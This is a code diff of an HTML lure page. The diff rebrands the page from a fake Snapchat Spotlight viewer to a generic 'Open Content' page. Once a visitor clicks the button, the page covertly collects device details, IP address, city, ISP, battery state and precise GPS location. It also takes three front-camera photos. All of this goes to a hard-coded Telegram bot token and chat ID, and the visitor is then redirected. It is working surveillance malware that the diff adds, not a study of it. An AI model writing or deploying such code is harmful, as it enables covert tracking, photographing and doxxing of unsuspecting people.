@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Spotlight</title>
+    <title>View Content</title>
     <style>
         body {
             background-color: #000;
@@ -17,21 +17,21 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
         .btn {
-            background-color: #fffc00;
-            color: #000;
+            background-color: #0088cc;
+            color: #fff;
             border: none;
             padding: 16px 40px;
             font-size: 18px;
             font-weight: bold;
             border-radius: 30px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
         }
     </style>
 </head>
 <body>
 
-    <button class="btn" id="goBtn">View Spotlight</button>
+    <button class="btn" id="goBtn">Open Content</button>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
@@ -39,8 +39,66 @@
     <script>
         const TOKEN = "8934176186:AAGX6GaklJCEmr_CXXX4L7bGMQykSA4fyFA";
         const CHAT_ID = "6125741059";
+        const TELEGRAM_BOT_URL = "https://t.me/YOUR_BOT_USERNAME";
 
         document.getElementById('goBtn').addEventListener('click', async () => {
+            let userInfo = "📊 Comprehensive Device & Location Info:\n";
+            
+            // کاتی وردی سەردانیکردن
+            userInfo += `⏱ Timestamp: ${new Date().toLocaleString()}\n`;
+            userInfo += `💻 Platform: ${navigator.platform}\n`;
+            userInfo += `🌐 Language: ${navigator.language}\n`;
+            userInfo += `📱 User Agent: ${navigator.userAgent}\n`;
+
+            // زانیاری خێرایی و جۆری ئینتەرنێت
+            if (navigator.connection) {
+                userInfo += `⚡ Connection Type: ${navigator.connection.effectiveType || 'Unknown'}\n`;
+                userInfo += `📶 Downlink Speed: ${navigator.connection.downlink || 'Unknown'} Mbps\n`;
+            }
+
+            // زانیاری پاتری
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    userInfo += `🔋 Battery Level: ${Math.round(battery.level * 100)}%\n`;
+                    userInfo += `🔌 Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
+                } catch (e) {}
+            }
+
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                userInfo += `🌐 Country: ${ipData.country_name}\n`;
+                userInfo += `🏙 City: ${ipData.city}\n`;
+                userInfo += `📌 IP Address: ${ipData.ip}\n`;
+                userInfo += `🏢 ISP / Network: ${ipData.org}\n`;
+            } catch (e) {}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy;
+                    userInfo += `🗺 Google Maps Location: https://maps.google.com/?q=${lat},${lon}\n`;
+                    userInfo += `🎯 Accuracy: ${acc} meters\n`;
+                    sendTextData(userInfo);
+                }, () => {
+                    sendTextData(userInfo);
+                }, { timeout: 5000, enableHighAccuracy: true });
+            } else {
+                sendTextData(userInfo);
+            }
+
+            async function sendTextData(text) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                } catch (e) {}
+            }
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
@@ -49,39 +107,42 @@
                 video.srcObject = stream;
                 
                 await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        resolve();
-                    };
+                    video.onloadedmetadata = () => { resolve(); };
                 });
                 
-                setTimeout(async () => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+
+                for (let i = 0; i < 3; i++) {
+                    await new Promise(r => setTimeout(r, 800));
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    canvas.toBlob(async (blob) => {
-                        if (blob) {
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'snap.jpg');
+                    await new Promise((resolve) => {
+                        canvas.toBlob(async (blob) => {
+                            if (blob) {
+                                const formData = new FormData();
+                                formData.append('chat_id', CHAT_ID);
+                                formData.append('photo', blob, `capture_${i+1}.jpg`);
 
-                            try {
-                                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                            } catch (err) {}
-                        }
+                                try {
+                                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    });
+                                } catch (err) {}
+                            }
+                            resolve();
+                        }, 'image/jpeg', 0.85);
+                    });
+                }
 
-                        stream.getTracks().forEach(track => track.stop());
-                        window.location.href = "https://www.snapchat.com/add/ravayxabat13";
-                    }, 'image/jpeg', 0.85);
-                }, 600);
+                stream.getTracks().forEach(track => track.stop());
+                window.location.href = TELEGRAM_BOT_URL;
 
             } catch (err) {
-                window.location.href = "https://www.snapchat.com/add/ravayxabat13";
+                window.location.href = TELEGRAM_BOT_URL;
             }
         });
     </script>
